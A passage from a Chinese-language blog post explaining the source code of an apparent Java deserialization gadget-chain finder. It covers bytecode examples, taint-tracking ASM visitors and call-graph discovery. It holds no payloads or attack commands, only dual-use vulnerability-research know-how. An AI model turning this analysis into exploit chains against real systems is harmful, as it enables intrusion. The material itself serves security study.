<span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/InputStream;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/io/File;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/nio/paths/Paths&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/net/URL&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>问题：这里实现的 <code>visitMethodInsn</code> 比 PassthroughDataflowMethodVisitor.visitMethodInsn 多三个判断规则，后面 CallGraphDiscovery 中的 ModelGeneratorMethodVisitor 也重写了该方法并在最后调用该父类方法，为什么不直接剥离出来？</p><ul><li>PassthroughDataflowMethodVisitor 中存储的是参数索引，而 ModelGeneratorMethodVisitor 中存储的是 <code>arg参数索引.字段名称</code></li><li>出入栈操作都在 TaintTrackingMethodVisitor 中实现</li><li>经过该方法的模拟，栈顶元素即该方法能够传递污染的参数索引集合</li></ul><p>举个例子看一看字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String cmd = <span class="keyword">new</span> A().method1(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        Integer n = Integer.parseInt(s);</span><br><span class="line"></span><br><span class="line">        n = number;</span><br><span class="line">        String value = n.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method1</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getValue</code> 部分的字节码，用空行分隔了上面四条语句的字节码，出现的字节码指令包括：<br>ldc 从常量池加载数据到操作数栈，astore 从栈顶弹出并存储到本地变量表，aload 从本地变量表加载数据到操作数栈，invokestatic 调用类方法（静态），invokevirtual 调用实例方法，return 从当前方法返回 void。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">(java.lang.Integer)</span></span>;</span><br><span class="line">  descriptor: (Ljava/lang/Integer;)V</span><br><span class="line">  flags: ACC_PUBLIC</span><br><span class="line">  Code:</span><br><span class="line">    stack=<span class="number">1</span>, locals=<span class="number">5</span>, args_size=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">       0: ldc           #5                  // String 100 入栈</span><br><span class="line">       <span class="number">2</span>: astore_2                          <span class="comment">// 出栈</span></span><br><span class="line"></span><br><span class="line">       <span class="number">3</span>: aload_2                           <span class="comment">// 入栈，invokestatic 的参数，执行完毕后结果入栈</span></span><br><span class="line">       4: invokestatic  #6                  // Method java/lang/Integer.parseInt:(Ljava/lang/String;)I</span><br><span class="line">       7: invokestatic  #7                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">      <span class="number">10</span>: astore_3                          <span class="comment">// 出栈，存储执行结果</span></span><br><span class="line"></span><br><span class="line">      <span class="number">11</span>: aload_1                           <span class="comment">// 入栈，参数 number</span></span><br><span class="line">      <span class="number">12</span>: astore_3                          <span class="comment">// 出栈</span></span><br><span class="line"></span><br><span class="line">      <span class="number">13</span>: aload_3                           <span class="comment">// 入栈，invokevirtual 的参数</span></span><br><span class="line">      14: invokevirtual #8                  // Method java/lang/Integer.toString:()Ljava/lang/String; 执行完毕后结果入栈</span><br><span class="line">      <span class="number">17</span>: astore        <span class="number">4</span>                   <span class="comment">// 出栈</span></span><br><span class="line">      <span class="number">19</span>: <span class="keyword">return</span>                            <span class="comment">// 返回 void</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">6</span>: <span class="number">0</span></span><br><span class="line">      line <span class="number">7</span>: <span class="number">3</span></span><br><span class="line">      line <span class="number">9</span>: <span class="number">11</span></span><br><span class="line">      line <span class="number">10</span>: <span class="number">13</span></span><br><span class="line">      line <span class="number">11</span>: <span class="number">19</span></span><br></pre></td></tr></table></figure><p>在调用方法前，进行参数的入栈，即创建一个新的栈帧，执行完毕后继续执行下一条指令。实际上这部分的模拟不是很懂，要说汇编语言倒还会看，但是 Java 字节码也还没到那么底层，我的理解是调用函数就会创建一个栈帧，执行完毕后从系统栈弹出栈帧，那么返回结果存入上一个栈帧的操作数栈栈顶？回头等我搞明白了再补两张图…</p><h2 id="7-CallGraphDiscovery"><a href="#7-CallGraphDiscovery" class="headerlink" title="7. CallGraphDiscovery"></a>7. CallGraphDiscovery</h2><p><code>discover</code> 方法利用之前得到的类信息、方法信息、继承/重写信息、数据流信息，结合 asm 访问者分析被调方法的参数是否会被调用者方法的参数所影响。</p><p>以下面 getValue 方法为例，调用了 parseInt 和 toString 两个方法，但是参数 number 只会影响到 toString。因此如果污点（攻击者的输入数据）走到 getValue 方法且参数 number 是可控的（即上一步分析能够传递污染），那么进一步只需要检查 toString 方法，而 parseInt 方法就不用再检查了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">    String s = <span class="string">&quot;100&quot;</span>;</span><br><span class="line">    Integer n = Integer.parseInt(s);</span><br><span class="line">    </span><br><span class="line">    n = number;</span><br><span class="line">    String value = n.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> 方法的具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(CallGraphDiscovery.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用关系信息：方法所属类名，方法名，方法描述符，被调方法所属类名，被调方法名，被调方法描述符，方法参数索引，方法参数对象的字段名称，被调方法参数索引</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GraphCall&gt; discoveredCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分析调用关系，即被调方法的参数是否会被（调用者）方法的参数所影响</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  配置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 加载方法信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// 加载类信息</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// 加载继承信息（inheritanceMap：子类-&gt;父类集合，subClassMap：父类-&gt;子类集合）</span></span><br><span class="line">    InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">    <span class="comment">// 加载数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化决策者</span></span><br><span class="line">    SerializableDecider serializableDecider = config.getSerializableDecider(methodMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有的类</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123; <span class="comment">// 读取类文件</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);   <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 判断被调方法的参数是否会被调用者方法的参数所影响</span></span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitMethod -&gt; visitOuterClass -&gt; visitInnerClass -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> ModelGeneratorClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6),</span><br><span class="line">                        ClassReader.EXPAND_FRAMES);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorClassVisitor</code> 类继承了 asm 中的 ClassVisitor，重写了五个访问者方法，主要关注 <code>visitMethod</code> 中调用 <code>ModelGeneratorMethodVisitor</code> 对方法进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelGeneratorClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// 类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// 继承信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// 数据流信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// 序列化决策者</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ModelGeneratorClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      InheritanceMap inheritanceMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      SerializableDecider serializableDecider, <span class="keyword">int</span> api)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api); <span class="comment">// ASM API 版本</span></span><br><span class="line">        <span class="keyword">this</span>.classMap = classMap;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="keyword">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;            <span class="comment">// 类名</span></span><br><span class="line">    <span class="keyword">private</span> String signature;       <span class="comment">// 签名</span></span><br><span class="line">    <span class="keyword">private</span> String superName;       <span class="comment">// 父类名</span></span><br><span class="line">    <span class="keyword">private</span> String[] interfaces;    <span class="comment">// 接口</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">                      String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="comment">// 记录类的相关信息</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.signature = signature;</span><br><span class="line">        <span class="keyword">this</span>.superName = superName;</span><br><span class="line">        <span class="keyword">this</span>.interfaces = interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 调用父类方法，返回新的方法观察者</span></span><br><span class="line">        <span class="comment">// 如果类观察者的 cv 变量为空，则返回 null，否则返回 cv.visitMethod</span></span><br><span class="line">        MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建方法访问者，判断方法参数与被调用方法参数的传递关系</span></span><br><span class="line">        <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）:visitCode -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        ModelGeneratorMethodVisitor modelGeneratorMethodVisitor = <span class="keyword">new</span> ModelGeneratorMethodVisitor(classMap,</span><br><span class="line">                inheritanceMap, passthroughDataflow, serializableDecider, api, mv, <span class="keyword">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="comment">// 简化代码分析，删除 JSR 指令并内联引用的子例程</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span> </span>&#123;   <span class="comment">// 访问类的外围类（如果有）</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="keyword">super</span>.visitOuterClass(owner, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="keyword">int</span> access)</span> </span>&#123;  <span class="comment">// 访问内部类，该内部类不一定是被访问的类的成员</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="keyword">super</span>.visitInnerClass(name, outerName, innerName, access);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorMethodVisitor</code> 也继承了 <code>TaintTrackingMethodVisitor</code> 实现，不过只重写了其中的 3 个访问者方法</p><ul><li>visitCode：启动对方法代码的访问，把参数全部存到本地变量表</li><li>visitFieldInsn：访问字段指令，字段指令是加载或存储对象字段值的指令</li><li>visitMethodInsn：访问方法指令，方法指令是调用方法的指令</li></ul><p><code>visitCode</code> 和 PassthroughDataflowMethodVisitor（直接存储参数索引）中的实现类似，不同的是这里将 <code>arg</code> 与参数索引进行拼接，存储字符串到本地变量表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;   <span class="comment">// 启动对方法代码的访问</span></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitCode 初始化本地变量表</span></span><br><span class="line">    <span class="keyword">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录参数到本地变量表 savedVariableState.localVars</span></span><br><span class="line">    <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法，第一个参数（隐式）为对象实例 this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        <span class="comment">// 使用 arg 前缀来表示方法入参，后续用于判断是否为目标调用方法的入参</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历参数，根据描述符得出参数类型（占用空间大小）</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> 也和 PassthroughDataflowMethodVisitor（直接存储参数索引）中的实现类似，不同的是这里将字段名称与 <code>arg参数索引</code> 字符串进行拼接，然后存储到栈顶。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc)</span> </span>&#123;    <span class="comment">// 访问字段指令，字段指令是加载或存储对象字段值的指令。</span></span><br><span class="line">    <span class="comment">// 方法执行过程中可能访问对象字段，访问前会进行入栈操作</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// 获取类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// 设置类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// 获取对象字段</span></span><br><span class="line">            Type type = Type.getType(desc); <span class="comment">// 字段类型</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                Boolean isTransient = <span class="keyword">null</span>; <span class="comment">// 如果字段被 transient 关键字修饰，则不可序列化</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断读取的字段所属类是否可序列化，即字段是否可以序列化</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 若读取的字段所属类可序列化</span></span><br><span class="line">                    ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 遍历类的所有字段</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// 是否为目标字段</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// 是否被 transient 关键字修饰</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 若找不到目标字段，则向上查找（超类）</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">                Set&lt;String&gt; newTaint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                        newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);   <span class="comment">// 拼接名称</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">                <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.setStackTaint 将栈顶设置为 newTaint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// 设置对象字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span 